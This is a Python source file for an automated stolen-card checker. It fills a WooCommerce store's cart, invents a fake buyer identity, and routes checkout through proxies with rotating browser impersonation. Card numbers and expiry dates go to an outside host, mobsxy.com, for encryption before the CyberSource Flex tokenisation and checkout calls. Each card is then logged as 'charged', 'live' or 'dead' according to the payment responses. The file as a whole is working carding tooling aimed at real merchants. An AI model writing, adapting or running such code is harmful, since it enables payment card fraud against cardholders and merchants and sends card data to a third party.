import asyncio
import random
import re
import html
import base64
import json
from curl_cffi.requests import AsyncSession
from curl_cffi.requests import exceptions as ccx
from urllib.parse import urlparse, quote, unquote
from utils.address_helper import get_address
from utils.helper import split_card_details
from utils.logs import logs
from bs4 import BeautifulSoup
import requests


async def cyber_flex_check(card: str, base_url: str, proxy: str, max_retries: int = 3):

    for attempt in range(1, max_retries + 1):

        ####################### CONFIGURATION #########################
        site = urlparse(base_url if base_url.startswith(
            ("http://", "https://")) else f"https://{base_url}").hostname
        random_num = random.randint(1, 999)
        impersonate = random.choice(["chrome", "edge", "safari", "firefox"])

        card_details, cc, mm, m, yyyy, yy, cvv = split_card_details(card)

        ####################### FAKE INFORMATION #########################
        domain_to_country = {
            '.uk': 'gb',
            '.au': 'au',
            '.ca': 'ca',
        }

        site_country = "us"
        for suffix, country in {'.uk': 'gb', '.au': 'au', '.ca': 'ca'}.items():
            if suffix in site:
                site_country = country
                break

        information_data = get_address(site_country)
        user = information_data["user"]
        address = information_data["address"]

        if cc[0:1] == "5":
            card_type = "MASTER_CARD"
        elif cc[0:1] == "4":
            card_type = "VISA"
        else:
            logs("error", site, card_details,
                 "Card type is not supported", "PPCP Insu Auth")
            return

        first_name, last_name, email, phone, user_agent = (
            user.get("first_name", ""),
            user.get("last_name", ""),
            user.get("email", ""),
            user.get("phone", ""),
            user.get("user_agent", "")
        )

        street_address, city, region_code, state, postal_code, faker_postal_code, country = (
            address.get("street_address", ""),
            address.get("city", ""),
            address.get("region_code", ""),
            address.get("state", ""),
            address.get("postal_code"),
            address.get("faker_postal_code", ""),
            address.get("country", "")
        )
        proxy_body = {
            "http": proxy,
            "https": proxy,
        }
        email = f"{first_name}.{last_name}.{random_num}@gmail.com"
        try:
            await asyncio.sleep(random.uniform(0.5, 0.7))
            async with AsyncSession(impersonate=impersonate, proxies=proxy_body, verify=False, timeout=30) as session:

                headers = {
                    "User-Agent": user_agent,
                }

                ####################### Add To Cart - Checkout Flow #########################

                headers.update({
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "If-None-Match": "",
                    "Priority": "u=0, i",
                })

                response = await session.get(f"https://{site}/wp-json/wc/store/products?stock_status=instock&order=asc&orderby=price&min_price=1&max_price=99999999&page=1&per_page=100&type=simple", headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Add to Cart Failed", "Paypal Pro")
                        return
                    continue

                response_data = response.json()

                # Filter products
                available_product = [
                    product for product in response_data
                    if product.get("has_options") is False
                    and product.get("is_purchasable") is True
                    and product.get("is_in_stock") is True
                    and isinstance(product.get("add_to_cart"), dict)
                    and product["add_to_cart"].get("minimum") == 1
                ]

                if not available_product:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "No Available Product Found", "Paypal Pro")
                        return
                    continue

                product = available_product[0]
                product_id = int(product.get("id"))
                currency_code = product.get(
                    "prices", {}).get("currency_code", "USD")
                product_price = f"{int(product.get('prices', {}).get('price', 0)) / 100:.2f}"

                response = await session.get(f"https://{site}/wp-json/wc/store/cart", headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Cart Retrieval Failed", "Paypal Pro")
                        return
                    continue

                nonce = response.headers.get(
                    "nonce") or response.headers.get("X-WC-Store-API-Nonce")

                if not nonce:
                    nonce_search = re.search(
                        r'"nonce"\s*:\s*"([^"]+)"', response.text)
                    if nonce_search:
                        nonce = nonce_search.group(1)

                if not nonce:
                    logs("error", site, card,
                         "Nonce Retrieval Failed", "Paypal Pro")
                    return

                payload = {
                    "id": int(product_id),
                    "quantity": 1,
                }

                headers.update({
                    "Nonce": nonce,
                    "X-WC-Store-API-Nonce": nonce
                })

                response = await session.post(f"https://{site}/wp-json/wc/store/cart/add-item", json=payload, headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Add to Cart Failed", "Paypal Pro")
                        return
                    continue

                response_data = response.json()

                errors = response_data.get("errors", [])
                if errors:
                    error_msg = html.unescape(errors[0].get("message", ""))
                    lower_msg = error_msg.lower()
                    logs("error", site, card,
                         f"Add to Cart Error - {error_msg} - {lower_msg} - {attempt}", "Paypal Pro")
                    return

                customer_address = {
                    "first_name": first_name,
                    "last_name": last_name,
                    "company": "Zed Pogi",
                    "address_1": street_address,
                    "address_2": street_address,
                    "city": city,
                    "state": region_code,
                    "postcode": postal_code,
                    "country": country,
                    "phone": phone,
                    "email": email,
                }

                customer_payload = {
                    "billing_address": customer_address,
                    "shipping_address": customer_address,
                }

                headers.update({
                    "Nonce": nonce,
                    "Content-Type": "application/json",
                    "X-WC-Store-API-Nonce": nonce,
                })

                response = await session.post(f"https://{site}/wp-json/wc/store/cart/update-customer", json=customer_payload, headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Customer Update Failed", "Paypal Pro")
                        return
                    continue

                response_data = response.json()
                shipping_rate = None

                if response_data.get('needs_shipping'):
                    try:
                        shipping_rate = response_data['shipping_rates'][0]['shipping_rates'][0]['rate_id']

                    except (IndexError, KeyError, TypeError):
                        shipping_rate = None

                    if not shipping_rate:
                        logs("error", site, card,
                             "Shipping Rate Not Found", "Paypal Pro")
                        return

                    payload = {
                        "rate_id": shipping_rate
                    }

                    headers.update({
                        "Nonce": nonce,
                        "X-WC-Store-API-Nonce": nonce,
                        "Content-Type": "application/json",
                    })

                    response = await session.post(f"https://{site}/wp-json/wc/store/cart/select-shipping-rate", headers=headers, json=payload)

                    if response.status_code != 200:
                        if attempt == max_retries:
                            logs("error", site, card,
                                 "Shipping Rate Selection Failed", "Paypal Pro")
                            return
                        continue

                headers.update({
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Priority": "u=0, i"
                })
                response = await session.get(f"https://{site}/checkout", headers=headers)

                try:
                    response_unqoute = unquote(response.text)
                    capture_context = re.findall(
                        r'"capture_context":"(.*?)"', response_unqoute)[0]
                except:

                    logs("error", site, card_details,
                         "No Valid Capture Context")
                    return

                # Getting the token
                #print(capture_context)
                
                card_mode = f"{cc}|{mm}|{yyyy}"
                params = {
                    "card": card_mode,
                    "context": capture_context
                }

               

                response = requests.get(
                    "http://mobsxy.com/cyberflexv2", params=params, verify=False)

                flex_key = response.json().get("encryptedToken", "")
                #print(flex_key)
                
                # print(flex_key)
                if not flex_key:
                    logs("error", site, card_details,
                         "Invalid encryptor", "Cyber Flex")
                    return

                headers = {
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/jwt; charset=utf-8",
                    "Origin": "https://flex.cybersource.com",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "TE": "trailers",
                    "User-Agent": user_agent,
                }
                response = await session.post("https://flex.cybersource.com/flex/v2/tokens", headers=headers, data=flex_key, verify=False)
                flex_token = response.text

                # print(flex_token)
                if "Invalid card number format" in flex_token:
                    logs("error", site, card_details,
                         "Invalid card number format", "Cyber Flex")
                    return

                headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "If-None-Match": "",
                    "Priority": "u=0, i",
                    "Nonce": nonce,
                    "X-WC-Store-API-Nonce": nonce,
                    "Content-Type": "application/json",
                }

                customer_address_billing = {"first_name": first_name, "last_name": last_name, "company": f"{first_name} {last_name} Trading", "address_1": street_address,
                                            "address_2": street_address, "city": city, "state": state, "postcode": postal_code, "country": country, "phone": phone, "email": email}
                customer_address_shipping = {"first_name": first_name, "last_name": last_name, "company": f"{first_name} {last_name} Trading",
                                             "address_1": street_address, "address_2": street_address, "city": city, "state": state, "postcode": postal_code, "country": country, "phone": phone, }

                payload = {"billing_address": customer_address_billing, "shipping_address": customer_address_shipping, "payment_data": [{"key": "wc-cybersource-credit-card-expiry", "value": f"{mm} / {yy}"}, {
                    "key": "wc-cybersource-credit-card-flex-token", "value": flex_token}, {"key": "wc-cybersource-credit-card-flex-key", "value": capture_context}], "payment_method": "cybersource_credit_card"}
                response = await session.post(f"https://{site}/wp-json/wc/store/checkout", headers=headers, json=payload)
                #print(response.text)

                if not response:
                    logs("error", site, card,
                         "Failed to create checkout session", "Cyber Flex")
                    return

                if "application/json" in response.headers.get('Content-Type', ""):
                    if response.text.strip():  # may laman talaga
                        try:
                            resp_data = response.json()

                        except ValueError:
                            # print("Invalid JSON received:", resp.text[:200])
                            logs("error", site, card,
                                 "Invalid JSON", "Cyber Flex")
                            return
                    else:
                        logs("error", site, card, "Empty JSON body", "Cyber Flex")
                        return

                    payment_status = resp_data.get(
                        "payment_result", {}).get("payment_status", "")
                    payment_details = resp_data.get(
                        "payment_result", {}).get("payment_details", [])
                    if not payment_details and payment_status == "success":  # Fake Lives
                        logs("dead", site, card_details,
                             "DEAD FAKE LIVE", "Cyber Flex")
                        return
                    elif payment_details and payment_status == "success":
                        redirect_url = resp_data.get(
                            "payment_result", {}).get("redirect_url", "")
                        if not redirect_url:
                            logs("error", site, card,
                                 "NO REDIRECT URL", "Cyber Flex")
                            return
                        else:
                            logs("charged", site, card_details,
                                 f"CHARGED! {currency_code} {product_price}", "Cyber Flex")
                            return
                    else:
                        message = next((item.get("value") for item in resp_data.get("payment_result", {
                        }).get("payment_details", []) if item.get("key") == "message"), None)

                        if message:
                            message = message.strip()
                            msg_lower = message.lower()
                            if "avs" in msg_lower or "postal" in msg_lower or "address does not match" in msg_lower:
                                logs("live", site, card_details,
                                     f"AVS/POSTAL MISMATCH - {message}", "Cyber Flex")
                                return
                            elif "insufficient funds" in msg_lower or "insu" in msg_lower:
                                logs("live", site, card_details,
                                     message, "Cyber Flex")
                                return
                            elif "the card verification number is invalid" in msg_lower:
                                logs(
                                    "live", site, card_details, f"CARD VERIFICATION NUMBER MISMATCH - {message}", "Cyber Flex")
                                return
                            else:
                                logs("dead", site, card,
                                     f" {message}", "Cyber Flex")
                                return

                        else:
                            message = resp_data.get(
                                "message") or resp_data.get("errorMessage")
                            if not message:
                                payment_details = resp_data.get(
                                    "payment_result", {}).get("payment_details", [])
                                if isinstance(payment_details, list):
                                    for item in payment_details:
                                        if item.get("key") in ("message", "errorMessage"):
                                            message = item.get("value")
                                            break
                            if not message:
                                message = f"Unknown error {response.status_code}"
                                logs("dead", site, card,
                                     f" {message}", "Cyber Flex")
                                return
                            elif "the card verification number is invalid" in message.lower():
                                logs("live", site, card_details,
                                     message, "Cyber Flex")
                                return
                            elif "insufficient funds in account" in message.lower():
                                logs(
                                    "live", site, card_details, f"{message} {currency_code} {product_price}", "Cyber Flex")
                                return
                            logs("dead", site, card_details,
                                 message, "Cyber Flex")
                            return
                else:

                    if 'Access is denied.' in response.text:
                        logs("error", site, card_details,
                             "Access is denied.", "Cyber Flex")
                        return
                    elif '500 Internal Server Error' in response.text:
                        logs("error", site, card_details,
                             "500 Internal Server Error Website's Fault", "Cyber Flex")
                        return
                    logs("dead", site, card_details,
                         "No message returned check logs", "Cyber Flex")
                    return
        except (ccx.ProxyError, ccx.ConnectionError, ccx.ConnectTimeout, ccx.Timeout, asyncio.TimeoutError) as e:
            if attempt == max_retries:
                logs("error", site, card,
                     f"FAILED] - {type(e).__name__}", "Cyber Flex")
                return
            continue

        except Exception as e:
            if attempt == max_retries:
                logs("error", site, card,
                     f"FAILED] - {type(e).__name__}", "Cyber Flex")
                return
            continue
